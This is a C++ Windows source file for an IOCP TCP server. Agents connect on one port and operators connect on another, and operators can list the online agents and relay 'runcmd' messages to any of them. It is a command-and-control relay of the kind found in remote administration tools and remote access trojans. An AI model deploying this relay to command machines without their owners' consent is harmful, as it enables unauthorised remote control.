// IOCP.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include <WinSock2.h>
#include <Windows.h>

#pragma comment(lib,"ws2_32.lib")

#include "CSLock.h"
#include "UserHandle.h"
#include "HelpFun.h"
#include "IOCPTcpClient.h"
#include "IOCPClientManager.h"
#include <list>
using namespace std;

#include "CtrlCodes.h"

#include "Buffer.h"
#include "..\公共\MemIni.h"

typedef struct tagIOCP_TCP_SERVER_PARAM
{
	IOCP_TCP_CALLBACK IOCPCallback;
	UINT nListenPort;
	HANDLE hIOCompletionPort;
	CIOCPClientManager *pClientManager;
	HANDLE hEvent;
	BOOL bStartRes;
}IOCP_TCP_SERVER_PARAM,*PIOCP_TCP_SERVER_PARAM;


HANDLE GetIOCPHandle( HANDLE hIOCPServer )
{
	PIOCP_TCP_SERVER_PARAM pIOCPTcpServer = (PIOCP_TCP_SERVER_PARAM)hIOCPServer;
	return pIOCPTcpServer->hIOCompletionPort;
}

CIOCPClientManager *GetIOCPClientManager( HANDLE hIOCPServer )
{
	PIOCP_TCP_SERVER_PARAM pIOCPTcpServer = (PIOCP_TCP_SERVER_PARAM)hIOCPServer;
	return pIOCPTcpServer->pClientManager;
}

IOCP_TCP_CALLBACK *GetIOCPCallbacks(HANDLE hIOCPServer)
{
	PIOCP_TCP_SERVER_PARAM pIOCPTcpServer = (PIOCP_TCP_SERVER_PARAM)hIOCPServer;
	return &(pIOCPTcpServer->IOCPCallback);
}

DWORD WINAPI IOCPWorkThread(LPVOID lpParam)
{
	PIOCP_TCP_SERVER_PARAM pServerParam = (PIOCP_TCP_SERVER_PARAM)lpParam;
	DWORD dwReturnBits=0;

	while ( TRUE )
	{
		PWSAOVERLAPPEDEX pOverLappedEx=NULL;

		HANDLE hClient = NULL;
		
		BOOL bRet = GetQueuedCompletionStatus(pServerParam->hIOCompletionPort,&dwReturnBits,(PULONG_PTR)&hClient,(LPWSAOVERLAPPED *)&pOverLappedEx,INFINITE);

		if ( dwReturnBits > 0 )
		{
			pServerParam->pClientManager->OnDataTransfer(hClient,pOverLappedEx,dwReturnBits);
		}
		else if( dwReturnBits == 0 )
		{
			pServerParam->pClientManager->DestoryIOCPClient(hClient);
		}
	}

	return 0;
}

DWORD WINAPI IOCPTcpServerAcceptThread( PVOID pParam )
{
	PIOCP_TCP_SERVER_PARAM pServerParam = (PIOCP_TCP_SERVER_PARAM)pParam;
	
	WSADATA wsaData;
	SOCKET AcceptSocket = INVALID_SOCKET;
	HANDLE hIOCompletionPort = NULL;

	do 
	{
		if (pServerParam == NULL)
		{
			break;
		}

		pServerParam->bStartRes = FALSE;
		
		WSAStartup(MAKEWORD(2,2),&wsaData);
		
		AcceptSocket = WSASocket(AF_INET,SOCK_STREAM,0,NULL,0,WSA_FLAG_OVERLAPPED);
		
		if(AcceptSocket == INVALID_SOCKET)
		{
			break;
		}

		SOCKADDR_IN InternetAddr;
		InternetAddr.sin_family = AF_INET;
		InternetAddr.sin_addr.s_addr = htonl(INADDR_ANY);
		InternetAddr.sin_port = htons(pServerParam->nListenPort);

		if ( SOCKET_ERROR == bind(AcceptSocket, (PSOCKADDR) &InternetAddr, sizeof(InternetAddr)) )
		{
			break;
		}
		
		if(SOCKET_ERROR == listen(AcceptSocket,500) )
		{
			break;
		}

		hIOCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0 );//创建完成端口
		if ( NULL == hIOCompletionPort )
		{
			break;
		}

		pServerParam->hIOCompletionPort = hIOCompletionPort;
	
		for ( int i=0;i<10;i++ )
		{
			HANDLE hIOCPWorkThread = CreateThread(NULL,0,IOCPWorkThread,pServerParam,0,NULL);
			CloseHandle(hIOCPWorkThread);
		}

		pServerParam->bStartRes = TRUE;

	} while (FALSE);

	SetEvent(pServerParam->hEvent);
	
	if ( pServerParam->bStartRes )
	{
		while (TRUE)
		{
			sockaddr sa;
			ZeroMemory(&sa,sizeof(sa));
			sa.sa_family=AF_INET;
			int len = sizeof(sa);
			SOCKET clientsock = WSAAccept(AcceptSocket,&sa,&len,NULL,0);

			HANDLE hClient = pServerParam->pClientManager->CreateIOCPClient(clientsock,&(pServerParam->IOCPCallback));

			if(pServerParam->pClientManager->JoinIOCP(hClient,hIOCompletionPort))
			{
				pServerParam->IOCPCallback.pClientConnect(hClient,(sockaddr_in *)&sa);
				pServerParam->pClientManager->PostRecvRequest(hClient);
			}

			
		}
	}

	if ( INVALID_SOCKET != AcceptSocket )
	{
		closesocket(AcceptSocket);
	}

	return 0;
}

HANDLE CreateIOCPTcpServer( UINT nListenPort , PIOCP_TCP_CALLBACK pTcpCallbacks)
{
	PIOCP_TCP_SERVER_PARAM pServerParam = new IOCP_TCP_SERVER_PARAM;

	memcpy_s(&(pServerParam->IOCPCallback),sizeof(pServerParam->IOCPCallback),pTcpCallbacks,sizeof(pServerParam->IOCPCallback));

	pServerParam->bStartRes = FALSE;
	pServerParam->hEvent = CreateEvent(NULL,FALSE,FALSE,NULL);
	pServerParam->nListenPort = nListenPort;
	pServerParam->pClientManager = new CIOCPClientManager;
	CreateThread(NULL,0,IOCPTcpServerAcceptThread,pServerParam,0,NULL);

	WaitForSingleObject(pServerParam->hEvent,INFINITE);
	
	return pServerParam;
}

VOID WINAPI OnlineClientEnumCallBack( PVOID pParam , HANDLE hClient )
{
	list<HANDLE> *plstHandles = (list<HANDLE> *)pParam;
	if (plstHandles)
	{
		plstHandles->push_back(hClient);
	}
}

HANDLE hToClientServer = NULL;
HANDLE hCtrlClientServer = NULL;


VOID WINAPI ClientConnectCallback( HANDLE hClient,sockaddr_in *psiClient )
{
	CIOCPClientManager *pClientManager = GetIOCPClientManager(hToClientServer);
	if (pClientManager)
	{
		BOOL *pbHeartBeatResponse = new BOOL;
		*pbHeartBeatResponse = TRUE;

		pClientManager->SetUserParam(hClient,pbHeartBeatResponse);
	}
}
VOID WINAPI ClientDisConnectCallback( HANDLE hClient , PVOID pUserParam)
{
	CIOCPClientManager *pClientManager = GetIOCPClientManager(hToClientServer);

	delete pUserParam;
}

VOID WINAPI DataRecvCallback( HANDLE hClient,PVOID pUserParam,BYTE *pDataBuffer,DWORD dwDataLen)
{
	CIOCPClientManager *pCtrlClientManager = GetIOCPClientManager(hCtrlClientServer);
	CIOCPClientManager *pClientManager = GetIOCPClientManager(hToClientServer);
	
	CMemIniFile Ini;
	Ini.ParseMemoryDataW(pDataBuffer,dwDataLen);

	if ( pCtrlClientManager && pCtrlClientManager )
	{
		CMemIniFile Ini;
		Ini.ParseMemoryDataW(pDataBuffer,dwDataLen);

		CString strCmd;
		strCmd = Ini.GetIniString(L"",L"cmd",L"");
		if (strCmd == L"heartbeat")
		{
			BOOL *pbHeartBeatResponse = (BOOL *)pClientManager->GetUserParam(hClient);
			
			if (pbHeartBeatResponse)
			{
				*pbHeartBeatResponse = TRUE;
			}
		}
		else
		{
			HANDLE hCtrlClient = (HANDLE)Ini.GetIniUint(L"",L"target",0);
			if (hCtrlClient)
			{
				pCtrlClientManager->PostSendRequest(hCtrlClient,pDataBuffer,dwDataLen,NULL);
			}
		}

	}

}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////




VOID WINAPI CtrlClientConnectCallback( HANDLE hClient,sockaddr_in *psiClient )
{

	// 	char chBuffer[]="ping www.baidu.com";
	// 	g_ClientManager.PostSendRequest(hClient,(BYTE *)chBuffer,strlen(chBuffer),NULL);
	// 	

	// 
	// 	int a=0;

}
VOID WINAPI CtrlClientDisConnectCallback( HANDLE hClient , PVOID pUserParam)
{
	//int a=0;
}

VOID WINAPI CtrlDataRecvCallback( HANDLE hClient,PVOID pUserParam,BYTE *pDataBuffer,DWORD dwDataLen)
{

	CIOCPClientManager *pCtrlClientManager = GetIOCPClientManager(hCtrlClientServer);
	CIOCPClientManager *pClientManager = GetIOCPClientManager(hToClientServer);

	CMemIniFile Ini;
	Ini.ParseMemoryDataW(pDataBuffer,dwDataLen);
	CString strCmd;
	strCmd = Ini.GetIniString(L"",L"cmd",L"");
	if (strCmd == L"getonlineclient")
	{
		CMemIniFile IniResponse;

		list<HANDLE> lstHandles;
		pClientManager->GetAllOnlineClient(OnlineClientEnumCallBack,&lstHandles);

		IniResponse.WriteIniString(L"",L"cmd",L"getonlineclient");
		IniResponse.WriteIniInt(L"",L"clientcount",lstHandles.size());
		
		int nIndex = 0;
		HANDLE hTempHandle = NULL;
		for (list<HANDLE>::const_iterator it = lstHandles.begin();it!=lstHandles.end();it++)
		{
			hTempHandle = *it;
			
			CString strTempKeyName;
			strTempKeyName.Format(L"client%d",nIndex);
			IniResponse.WriteIniInt(L"",strTempKeyName,(int)hTempHandle);
			nIndex++;
		}

		CString strResponse;
		strResponse = IniResponse.BuildData();

		pCtrlClientManager->PostSendRequest(hClient,(BYTE *)strResponse.GetBuffer(),strResponse.GetLength()*sizeof(WCHAR),NULL);
	}

	if (strCmd == L"runcmd")
	{
		HANDLE hTargetClient = (HANDLE)Ini.GetIniUint( L"",L"target", 0 );
		if (hTargetClient)
		{
			Ini.WriteIniInt(L"",L"source",(int)hClient);
			CString strSendData;
			strSendData = Ini.BuildData();

			pClientManager->PostSendRequest(hTargetClient,(BYTE *)strSendData.GetBuffer(),strSendData.GetLength()*sizeof(WCHAR),NULL);
		}

	}

}


VOID WINAPI OnlineClientEnumCallBack( PVOID pParam , HANDLE hClient );

DWORD WINAPI HeartBeatThread( PVOID pParam )
{
	PIOCP_TCP_SERVER_PARAM pServerParam = (PIOCP_TCP_SERVER_PARAM)pParam;

	WCHAR szHeartBeatData[]=L"[]\r\ncmd=heartbeat";
	while (TRUE)
	{
		list<HANDLE> lstHandles;

		pServerParam->pClientManager->GetAllOnlineClient( OnlineClientEnumCallBack, &lstHandles);

		HANDLE hTempHandle = NULL;
		for (list<HANDLE>::const_iterator it = lstHandles.begin();it!=lstHandles.end();it++)
		{
			BOOL *pbHeartBeatResponse = (BOOL *)pServerParam->pClientManager->GetUserParam(*it);
			if (pbHeartBeatResponse)
			{
				*pbHeartBeatResponse = FALSE;
			}
			
			pServerParam->pClientManager->PostSendRequest(*it,(BYTE *)szHeartBeatData,34,NULL);	
			
		}

		Sleep(5000);

		for (list<HANDLE>::const_iterator it = lstHandles.begin();it!=lstHandles.end();it++)
		{
			BOOL *pbHeartBeatResponse = (BOOL *)pServerParam->pClientManager->GetUserParam(*it);
			if ( pbHeartBeatResponse && FALSE == *pbHeartBeatResponse )
			{
				pServerParam->pClientManager->DestoryIOCPClient(*it);
			}
		}

		Sleep(5000);

	}


	return 0;
}

int _tmain(int argc, _TCHAR* argv[])
{

	IOCP_TCP_CALLBACK TcpCallback;
	TcpCallback.pClientConnect = ClientConnectCallback ;
	TcpCallback.pClientDisConnect = ClientDisConnectCallback ;
	TcpCallback.pDataRecv = DataRecvCallback;

	hToClientServer = CreateIOCPTcpServer(8889,&TcpCallback);

	HANDLE hHeartBeatThread = CreateThread(NULL,0,HeartBeatThread,(PVOID)hToClientServer,0,NULL);
	CloseHandle(hHeartBeatThread);

	IOCP_TCP_CALLBACK CtrlTcpCallback;
	CtrlTcpCallback.pClientConnect = CtrlClientConnectCallback ;
	CtrlTcpCallback.pClientDisConnect = CtrlClientDisConnectCallback ;
	CtrlTcpCallback.pDataRecv = CtrlDataRecvCallback;

	hCtrlClientServer = CreateIOCPTcpServer(8890,&CtrlTcpCallback);
// 	hHeartBeatThread = CreateThread(NULL,0,HeartBeatThread,(PVOID)hCtrlClientServer,0,NULL);
// 	CloseHandle(hHeartBeatThread);

	while (1)
	{
		Sleep(1000);
	}

	return 0;
}

